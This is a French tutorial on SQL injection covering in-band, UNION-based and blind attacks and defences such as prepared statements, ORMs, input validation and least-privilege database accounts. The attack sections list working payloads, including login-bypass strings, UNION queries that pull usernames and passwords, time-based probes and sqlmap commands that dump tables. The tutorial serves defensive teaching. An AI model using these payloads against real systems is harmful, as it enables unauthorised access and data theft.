# Injection SQL : comprendre et se protéger

L'injection SQL est classée **#3 dans l'OWASP Top 10** depuis des années. Elle permet à un attaquant de manipuler les requêtes SQL d'une application pour extraire, modifier ou supprimer des données. Des millions de sites restent vulnérables aujourd'hui.

## Comment fonctionne une injection SQL

Une application web vulnérable construit ses requêtes SQL en **concaténant directement les entrées utilisateur** :

```php
// Code PHP vulnérable
$username = $_GET['username'];  // Entrée utilisateur non filtrée
$query = "SELECT * FROM users WHERE username = '$username'";
// Si username = "admin" → SELECT * FROM users WHERE username = 'admin'
```

Un attaquant entre à la place : `admin' OR '1'='1`

```sql
-- Ce que ça génère :
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
--                                              ^^^^^^^^
--                              Toujours vrai → retourne TOUS les utilisateurs !
```

## Types d'injections SQL

### 1. Injection classique (In-band)

```sql
-- Contournement d'authentification
' OR '1'='1
' OR '1'='1' --
admin' --
' OR 1=1 --

-- Exemple sur un login :
Username: admin' --
Password: n'importe_quoi

-- Requête générée :
SELECT * FROM users WHERE username='admin' --' AND password='n'importe_quoi'
-- Le -- commente le reste → le mot de passe n'est plus vérifié !
```

### 2. UNION-based injection

Permet d'extraire des données d'autres tables :

```sql
-- Identifier le nombre de colonnes
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --   ← Erreur = il y a 2 colonnes

-- Extraire des données avec UNION
' UNION SELECT username, password FROM users --

-- Exemples de données intéressantes
' UNION SELECT table_name, null FROM information_schema.tables --
' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT username, password FROM users --
```

### 3. Blind SQL Injection

L'application ne retourne pas les données mais on peut poser des questions vraie/fausse :

```sql
-- Boolean-based blind
' AND 1=1 --    ← Page normale (vrai)
' AND 1=2 --    ← Page différente (faux)

-- Extraire caractère par caractère
' AND SUBSTRING(username,1,1)='a' --
' AND SUBSTRING(username,1,1)='b' --
... jusqu'à trouver le bon caractère

-- Time-based blind (si aucune différence visible)
' AND SLEEP(5) --        ← MySQL : délai de 5 secondes = vulnérable
' AND pg_sleep(5) --     ← PostgreSQL
' WAITFOR DELAY '0:0:5'  ← MSSQL
```

### 4. SQLMap — Automatisation

```bash
# SQLMap automatise la détection et l'exploitation des injections SQL
# À utiliser UNIQUEMENT sur des systèmes que vous êtes autorisé à tester

# Test basique
sqlmap -u "http://exemple.com/page?id=1"

# Avec cookie d'authentification
sqlmap -u "http://exemple.com/page?id=1" --cookie="session=abc123"

# Extraire les bases de données
sqlmap -u "http://exemple.com/page?id=1" --dbs

# Extraire les tables d'une base
sqlmap -u "http://exemple.com/page?id=1" -D nom_bdd --tables

# Extraire les données d'une table
sqlmap -u "http://exemple.com/page?id=1" -D nom_bdd -T users --dump

# Test sur un formulaire POST
sqlmap -u "http://exemple.com/login" --data="username=admin&password=test"
```

## Comment se protéger

### 1. Requêtes préparées (Prepared Statements)

**La solution principale** — séparer le code SQL des données.

```python
# Python avec SQLite - VULNÉRABLE
username = request.form['username']
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")

# Python avec SQLite - SÉCURISÉ (requête préparée)
username = request.form['username']
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
# Le ? est un placeholder - les données ne sont JAMAIS interprétées comme du SQL
```

```php
// PHP avec PDO - SÉCURISÉ
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);
$user = $stmt->fetch();
```

```javascript
// Node.js avec mysql2 - SÉCURISÉ
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE username = ?',
  [username]
);
```

```java
// Java avec PreparedStatement - SÉCURISÉ
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ?"
);
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();
```

### 2. ORM (Object-Relational Mapping)

```python
# SQLAlchemy (Python) - Immunisé contre SQLi par défaut
user = User.query.filter_by(username=username).first()

# Sequelize (Node.js)
const user = await User.findOne({ where: { username: username } });

# Ces ORMs génèrent automatiquement des requêtes préparées
```

### 3. Validation et assainissement des entrées

```python
import re

def valider_username(username):
    # Whitelist : seulement lettres, chiffres, tirets et underscores
    if not re.match(r'^[a-zA-Z0-9_-]{3,50}$', username):
        raise ValueError("Username invalide")
    return username

def valider_id(id_str):
    # Un ID doit être un entier
    try:
        return int(id_str)
    except ValueError:
        raise ValueError("ID invalide")
```

### 4. Principe du moindre privilège pour la base de données

```sql
-- Créer un utilisateur avec seulement les droits nécessaires
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'mot_de_passe_fort';

-- Accorder seulement SELECT, INSERT, UPDATE (pas DELETE ni DROP !)
GRANT SELECT, INSERT, UPDATE ON ma_base.* TO 'webapp'@'localhost';

-- NE JAMAIS utiliser root pour l'application web
-- JAMAIS : mysql_connect("localhost", "root", "")
```

### 5. WAF (Web Application Firewall)

```nginx
# ModSecurity avec Nginx
modsecurity on;
modsecurity_rules_file /etc/nginx/modsec/main.conf;
# Détecte et bloque automatiquement les patterns SQLi connus
```

## Checklist anti-injection SQL

```
✅ Requêtes préparées partout (jamais de concaténation)
✅ ORM pour les opérations CRUD standard
✅ Validation stricte des entrées (type, longueur, format)
✅ Utilisateur BD avec droits minimum
✅ Messages d'erreur génériques (ne pas exposer la structure BD)
✅ WAF en complément
✅ Tests réguliers avec SQLMap et OWASP ZAP
✅ Logs des erreurs SQL (pour détecter les tentatives)
```

## Conclusion

L'injection SQL est l'une des vulnérabilités les plus anciennes et pourtant encore très présente. La règle est simple : **jamais de concaténation de données utilisateur dans du SQL**. Les requêtes préparées règlent 99% des problèmes.

---
*Article suivant : [Sécurité des conteneurs Docker](../articles/securite-docker)*
